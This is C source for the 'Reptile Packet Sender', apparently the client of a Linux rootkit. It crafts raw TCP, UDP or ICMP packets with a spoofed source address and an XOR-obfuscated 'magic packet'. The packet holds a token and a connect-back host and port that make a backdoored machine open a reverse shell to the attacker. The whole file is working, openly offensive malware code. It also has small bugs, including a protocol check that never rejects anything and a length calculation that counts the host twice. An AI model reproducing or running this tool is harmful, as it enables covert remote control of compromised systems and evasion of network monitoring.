#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

#include "util.h"

unsigned short csum(unsigned short *buf, int nwords)
{
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}

void tcp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport,
	 char *data, unsigned int data_len)
{
	int socktcp;
	unsigned int nbytes, pckt_tam;
	char *buffer;
	struct iphdr *iph;
	struct tcphdr *tcph;
	struct sockaddr_in s;
	socklen_t optval = 1;

	pckt_tam = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;

	// printf("tamanho tcp: %d\n", pckt_tam);

	if (!(buffer = (char *)malloc(pckt_tam)))
		fatal("on allocating buffer memory");

	memset(buffer, '\0', pckt_tam);

	iph = (struct iphdr *)buffer;
	tcph = (struct tcphdr *)(buffer + sizeof(struct iphdr));

	if ((socktcp = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
		fatal("on creating TCP socket");

	if (setsockopt(socktcp, IPPROTO_IP, IP_HDRINCL, &optval,
		       sizeof(optval)) == -1)
		fatal("on setsockopt");

	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct tcphdr)), data,
	       data_len);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->id = htons(ID);
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->tot_len = pckt_tam;
	iph->saddr = inet_addr(srcip);
	iph->daddr = inet_addr(dstip);

	tcph->source = htons(srcport);
	tcph->dest = htons(dstport);

	tcph->seq = htons(SEQ);
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(WIN);
	tcph->urg_ptr = 0;

	tcph->check =
	    csum((unsigned short *)tcph, sizeof(struct tcphdr) + data_len);
	iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));

	s.sin_family = AF_INET;
	s.sin_port = htons(dstport);
	s.sin_addr.s_addr = inet_addr(dstip);

	if ((nbytes = sendto(socktcp, buffer, iph->tot_len, 0,
			     (struct sockaddr *)&s, sizeof(struct sockaddr))) ==
	    0)
		fatal("on sending package");

	fprintf(stdout, "%s TCP: %u bytes was sent!\n", good, nbytes);
	free(buffer);
	close(socktcp);
}

void icmp(char *srcip, char *dstip, char *data, unsigned int data_len)
{
	int sockicmp;
	unsigned int nbytes, pckt_tam;
	char *buffer;
	struct iphdr *iph;
	struct icmphdr *icmp;
	struct sockaddr_in s;
	socklen_t optval = 1;

	pckt_tam = (sizeof(struct iphdr) + sizeof(struct icmphdr) + data_len);

	// printf("tamanho icmp: %d\n", pckt_tam);

	if (!(buffer = (char *)malloc(pckt_tam)))
		fatal("on allocating buffer memory");

	memset(buffer, '\0', pckt_tam);

	iph = (struct iphdr *)buffer;
	icmp = (struct icmphdr *)(buffer + sizeof(struct iphdr));

	if ((sockicmp = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1)
		fatal("in creating raw ICMP socket");

	if (setsockopt(sockicmp, IPPROTO_IP, IP_HDRINCL, &optval,
		       sizeof(optval)) == -1)
		fatal("in setsockopt");

	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct icmphdr)), data,
	       data_len);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->id = htons(ID);
	iph->ttl = 255;
	iph->protocol = IPPROTO_ICMP;
	iph->saddr = inet_addr(srcip);
	iph->daddr = inet_addr(dstip);
	iph->tot_len = pckt_tam;

	icmp->type = 8;
	icmp->code = ICMP_ECHO;
	icmp->un.echo.id = htons(WIN);
	icmp->un.echo.sequence = htons(SEQ);

	icmp->checksum =
	    csum((unsigned short *)icmp, sizeof(struct icmphdr) + data_len);

	iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));

	s.sin_family = AF_INET;
	s.sin_addr.s_addr = inet_addr(dstip);

	if ((nbytes = sendto(sockicmp, buffer, iph->tot_len, 0,
			     (struct sockaddr *)&s, sizeof(struct sockaddr))) ==
	    0)
		fatal("on sending package");

	fprintf(stdout, "%s ICMP: %u bytes was sent!\n", good, nbytes);
	free(buffer);
	close(sockicmp);
}

void udp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport,
	 char *data, unsigned int data_len)
{
	int sockudp;
	unsigned int nbytes, pckt_tam;
	char *buffer;
	struct iphdr *iph;
	struct udphdr *udph;
	struct sockaddr_in s;
	socklen_t optval = 1;

	pckt_tam = sizeof(struct iphdr) + sizeof(struct udphdr) + data_len;

	// printf("tamanho udp: %d\n", pckt_tam);

	if (!(buffer = (char *)malloc(pckt_tam)))
		fatal("on allocating buffer memory");

	memset(buffer, '\0', pckt_tam);

	iph = (struct iphdr *)buffer;
	udph = (struct udphdr *)(buffer + sizeof(struct iphdr));

	if ((sockudp = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
		fatal("on creating UDP socket");

	if (setsockopt(sockudp, IPPROTO_IP, IP_HDRINCL, &optval,
		       sizeof(optval)) == -1)
		fatal("on setsockopt");

	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct udphdr)), data,
	       data_len);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->id = htons(ID);
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->tot_len = pckt_tam;
	iph->saddr = inet_addr(srcip);
	iph->daddr = inet_addr(dstip);

	udph->source = htons(srcport);
	udph->dest = htons(dstport);
	udph->len = htons(sizeof(struct udphdr) + data_len);

	udph->check =
	    csum((unsigned short *)udph, sizeof(struct udphdr) + data_len);
	iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));

	s.sin_family = AF_INET;
	s.sin_port = htons(dstport);
	s.sin_addr.s_addr = inet_addr(dstip);

	if ((nbytes = sendto(sockudp, buffer, iph->tot_len, 0,
			     (struct sockaddr *)&s, sizeof(struct sockaddr))) ==
	    0)
		fatal("on sending package");

	fprintf(stdout, "%s UDP: %u bytes was sent!\n", good, nbytes);
	free(buffer);
	close(sockudp);
}

void usage(char *argv0)
{
	fprintf(stderr, "\n\e[01;32mReptile Packet Sender\e[00m\n");
	fprintf(stderr, "\e[01;31mWritten by F0rb1dd3n\e[00m\n");
	fprintf(stderr, "\nUsage: %s [options]\n\n", argv0);
	fprintf(stderr, "-t\tTarget\n");
	fprintf(stderr, "-r\tRemote port from magic packets (only for tcp/udp)\n");
	fprintf(stderr, "-x\tMagic Packet protocol (tcp/icmp/udp)\n");
	fprintf(stderr, "-s\tSource IP address to spoof\n");
	fprintf(stderr, "-q\tSource port from magic packets (only for tcp/udp)\n");
	fprintf(stderr, "-l\tHost to receive the reverse shell\n");
	fprintf(stderr, "-p\tHost port to receive the reverse shell\n");
	fprintf(stderr, "-k\tToken to trigger the port-knocking\n\n");
	exit(1);
}

int main(int argc, char **argv)
{
	int opt, dstport, srcport, len;
	char *prot, *dstip, *srcip, *connect_back_host, *connect_back_port,
	    *token, *data;

	dstport = srcport = 0;

	prot = dstip = srcip = connect_back_host = connect_back_port = token =
	    NULL;

	while ((opt = getopt(argc, argv, "x:t:l:p:r:s:q:k:")) != EOF) {
		switch (opt) {
		case 'x':
			prot = optarg;
			if (strcmp(prot, "icmp") == 0 ||
			    strcmp(prot, "ICMP") == 0) {
				if (strcmp(prot, "udp") == 0 ||
				    strcmp(prot, "UDP") == 0) {
					if (strcmp(prot, "tcp") == 0 ||
					    strcmp(prot, "TCP") == 0) {
						printf("%s wrong "
						       "protocol\n",
						       bad);
						exit(-1);
					}
				}
			}
			break;
		case 't':
			if (strlen(optarg) > 15) {
				printf("%s wrong IP address\n", bad);
				exit(-1);
			}
			dstip = optarg;
			break;
		case 'l':
			if (strlen(optarg) > 15) {
				printf("%s wrong IP address\n", bad);
				exit(-1);
			}
			connect_back_host = optarg;
			break;
		case 'p':
			if (atoi(optarg) < 0 || atoi(optarg) > 65535) {
				printf("%s wrong port\n", bad);
				exit(-1);
			}
			connect_back_port = optarg;
			break;
		case 'r':
			if (atoi(optarg) < 0 || atoi(optarg) > 65535) {
				printf("%s wrong port\n", bad);
				exit(-1);
			}
			dstport = atoi(optarg);
			break;
		case 's':
			if (strlen(optarg) > 15) {
				printf("%s wrong IP address\n", bad);
				exit(-1);
			}
			srcip = optarg;
			break;
		case 'q':
			if (atoi(optarg) < 0 || atoi(optarg) > 65535) {
				printf("%s wrong port\n", bad);
				exit(-1);
			}
			srcport = atoi(optarg);
			break;
		case 'k':
			if (strlen(optarg) > 16 || strlen(optarg) < 5) {
				printf("%s wrong size of token\n", bad);
				exit(-1);
			}
			token = optarg;
			break;
		default:
			usage(argv[0]);
			break;
		}
	}

	if (prot == NULL || dstip == NULL || srcip == NULL ||
	    connect_back_host == NULL || connect_back_port == NULL ||
	    token == NULL) {
		usage(argv[0]);
	}

	if (strcmp(prot, "tcp") == 0 || strcmp(prot, "udp") == 0 ||
	    strcmp(prot, "TCP") == 0 || strcmp(prot, "UDP") == 0) {
		if (srcport == 0 || dstport == 0)
			usage(argv[0]);
	}

	len = strlen(token) + strlen(connect_back_host) +
	      strlen(connect_back_host) + 3;
	data = (char *)malloc(len);

	if (!data)
		fatal("malloc");

	bzero(data, len);
	snprintf(data, len, "%s %s %s", token, connect_back_host,
		 connect_back_port);
	len = strlen(data);
	// printf("data size: %d\n", len);

	_xor(data, 11, len);
	_add(data, 15, len);

	if (strcmp(prot, "tcp") == 0 || strcmp(prot, "TCP") == 0) {
		tcp(srcip, dstip, srcport, dstport, data, len);
	} else if (strcmp(prot, "icmp") == 0 || strcmp(prot, "ICMP") == 0) {
		icmp(srcip, dstip, data, len);
	} else if (strcmp(prot, "udp") == 0 || strcmp(prot, "UDP") == 0) {
		udp(srcip, dstip, srcport, dstport, data, len);
	}

	return EXIT_SUCCESS;
}
